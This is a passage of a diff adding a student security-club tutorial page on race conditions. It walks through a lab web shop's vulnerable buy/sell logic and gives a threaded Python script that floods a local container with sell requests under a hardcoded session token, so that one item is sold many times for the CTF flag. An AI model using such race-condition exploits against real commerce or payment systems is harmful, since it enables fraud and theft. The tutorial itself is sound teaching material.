+            <span class=o>.</span><span class=n>where</span><span class=p>(</span><span class=n>User</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=n>user_obj</span><span class=o>.</span><span class=n>id</span><span class=p>)</span> \
+            <span class=o>.</span><span class=n>execute</span><span class=p>()</span>
+
+        <span class=k>return</span> <span class=kc>True</span><span class=p>,</span> <span class=s2>&#34;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can see that the item is sold before the users balance is updated. Had the application been single threaded this would not be a problem, as nothing would use the shared resource in between requests, however it is multi threaded meaning different threads may alter the shared resource without alerting the other threads. This presents us with a race condition, due to the time between the item being sold and the balance being updated, that an adversary could make an unexpected change.</p>
+<h3 id=exploitation-2>Exploitation</h3>
+<p>To exploit this, we can write a Python script to automate the process of sending buy and sell requests. We want to send significantly more sell requests than buys, and hopefully this will cause the application to sell 2+ of the same item, giving us (at least) twice the amount of money than the products value.</p>
+<p>I grabbed the session token and hard coded that into my script, then Python&rsquo;s threading module to barrage the web server will sell requests, while occasionally sending a buy request.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/bin/python3</span>
+<span class=kn>from</span> <span class=nn>requests</span> <span class=kn>import</span> <span class=n>post</span><span class=p>,</span> <span class=n>get</span>
+<span class=kn>import</span> <span class=nn>threading</span>
+<span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
+
+<span class=n>token</span> <span class=o>=</span> <span class=s2>&#34;ae889bdb-20e8-42f5-af0f-c96d4e3d8074&#34;</span>
+<span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://172.20.0.2:5000&#34;</span>
+
+<span class=k>def</span> <span class=nf>buy</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
+  <span class=k>return</span> <span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/buy/1&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;token&#34;</span><span class=p>:</span> <span class=n>token</span><span class=p>})</span>
+
+<span class=k>def</span> <span class=nf>sell</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
+  <span class=nb>id</span> <span class=o>=</span> <span class=n>find_id</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
+  <span class=k>return</span> <span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/sell/</span><span class=si>{</span><span class=nb>id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;token&#34;</span><span class=p>:</span> <span class=n>token</span><span class=p>})</span>
+  
+<span class=k>def</span> <span class=nf>find_id</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
+  <span class=n>body</span> <span class=o>=</span> <span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;token&#34;</span><span class=p>:</span> <span class=n>token</span><span class=p>})</span><span class=o>.</span><span class=n>text</span>
+  <span class=k>return</span> <span class=n>body</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;&lt;form action=</span><span class=se>\&#34;</span><span class=s2>/sell/&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2> method=</span><span class=se>\&#34;</span><span class=s2>post</span><span class=se>\&#34;</span><span class=s2>&gt;&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> 
+
+<span class=k>class</span> <span class=nc>Buyer</span><span class=p>(</span><span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>):</span>
+  <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+      <span class=c1>#print(&#34;Buying go faster juice...&#34;)</span>
+      <span class=n>buy</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
+      <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+
+<span class=k>class</span> <span class=nc>Seller</span><span class=p>(</span><span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>):</span>
+  <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+      <span class=k>try</span><span class=p>:</span>
+        <span class=c1>#print(&#34;Selling Go faster juice..&#34;)</span>
+        <span class=n>sell</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
+      <span class=k>except</span><span class=p>:</span>
+        <span class=k>pass</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+  <span class=n>b</span> <span class=o>=</span> <span class=n>Buyer</span><span class=p>()</span>
+  <span class=n>b</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+  <span class=n>sellers</span> <span class=o>=</span> <span class=p>[]</span>
+  <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
+      <span class=n>sellers</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>Seller</span><span class=p>())</span>
+      <span class=n>sellers</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>After a little while, I had loads of cash. Enough to buy <code>Gentle words of encouragement</code>, the <code>Super not important flag</code>, <strong>and</strong> a <code>Beer O'clock Voucher</code>.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss16.png data-srcset="/posts/2022_race_conditions/images/ss16.png, images/ss16.png 1.5x, /posts/2022_race_conditions/images/ss16.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss16.png title="Got the flag"></p>
+<h1 id=conclusion>Conclusion</h1>
+<p>I hope you enjoyed this tutorial. Race conditions are not a topic covered on the current course syllabus, so hopefully this was a useful introduction, and enough for everyone to understand the basics.</p>
+<p>Have a go at the challenge 3 container if you can, there will be a challenge published onto CTFd soon that will combine everything we&rsquo;ve learnt so far in the binary exploitation sessions, from ROP to race. I hope you&rsquo;re looking forward to it!</p>
+</div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Updated on 2022-02-17&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/8138df0f6892e2900d266281dc7b0c7efc161e25 target=_blank title="commit by sharkmoos(muddy117@gmail.com) 8138df0f6892e2900d266281dc7b0c7efc161e25: Update index.md">
+<i class="fas fa-hashtag fa-fw"></i>8138df0</a></span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/posts/2022_race_conditions/index.md target=_blank>Read Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/web/>web</a>,&nbsp;<a href=/tags/software_security/>software_security</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
+</section>
+</div>
+<div class=post-nav><a href=/posts/2021_twelvetide/ class=prev rel=prev title="Twelvetide CTF"><i class="fas fa-angle-left fa-fw"></i>Twelvetide CTF</a></div>
+</div>
+<div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong>
+<noscript>
+Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
+</html>
